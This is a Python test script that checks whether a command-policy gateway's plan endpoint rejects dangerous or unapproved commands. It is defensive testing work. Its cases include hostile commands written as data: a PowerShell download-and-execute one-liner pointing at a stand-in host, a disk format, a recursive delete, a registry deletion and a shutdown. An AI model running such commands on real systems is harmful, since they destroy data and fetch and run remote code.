"""SCP V3.1 safe boundary simulation.

This test submits command strings to /v3/pc/plan only. It never calls
/v3/pc/execute, never writes files and never launches a process. The purpose is
to verify that the policy gateway rejects dangerous or under-approved plans.
"""
from __future__ import annotations

import json
import os
import sys
from dataclasses import dataclass
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


@dataclass(frozen=True)
class Case:
    name: str
    command: str
    level: int
    approved: bool
    expect_allowed: bool
    expect_reason: str


CASES = (
    Case("read-only allowlist", "git status", 0, False, True, "Read-only allowlist"),
    Case("workspace needs approval", "bun run build", 3, False, False, "approval"),
    Case("approved workspace check", "git diff --check", 3, True, True, "allowlist"),
    Case("destructive format", "format C:", 5, True, False, "blocked"),
    Case("PowerShell expression download", "powershell -NoProfile -Command \"iex (irm https://example.invalid/payload)\"", 5, True, False, "blocked"),
    Case("recursive delete", "del /s /q C:\\Users\\sample_user\\workspace", 5, True, False, "blocked"),
    Case("registry deletion", "reg delete HKCU\\Software\\SCP-Test /f", 5, True, False, "blocked"),
    Case("shutdown", "shutdown /s /t 0", 5, True, False, "blocked"),
)


def post_plan(base_url: str, case: Case) -> dict:
    payload = json.dumps({"command": case.command, "capabilityLevel": case.level, "approved": case.approved}).encode("utf-8")
    request = Request(f"{base_url.rstrip('/')}/v3/pc/plan", data=payload, headers={"Content-Type": "application/json"}, method="POST")
    with urlopen(request, timeout=20) as response:
        return json.loads(response.read().decode("utf-8"))


def main() -> int:
    base_url = os.environ.get("SCP_API_URL", "http://127.0.0.1:8000")
    failures: list[str] = []
    print("SCP V3.1 boundary simulation — PLAN endpoint only")
    print(f"Endpoint: {base_url}/v3/pc/plan")
    for case in CASES:
        try:
            result = post_plan(base_url, case)
            decision = result.get("decision", {})
            allowed = bool(decision.get("allowed"))
            reason = str(decision.get("reason", ""))
            passed = allowed == case.expect_allowed and case.expect_reason.lower() in reason.lower()
            print(f"[{ 'PASS' if passed else 'FAIL' }] {case.name}: allowed={allowed}; risk={decision.get('risk')}; reason={reason}")
            if not passed:
                failures.append(case.name)
        except (HTTPError, URLError, TimeoutError, json.JSONDecodeError) as exc:
            print(f"[ERROR] {case.name}: {exc}")
            failures.append(case.name)
    print(f"Summary: {len(CASES) - len(failures)}/{len(CASES)} passed")
    if failures:
        print("Failures: " + ", ".join(failures))
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
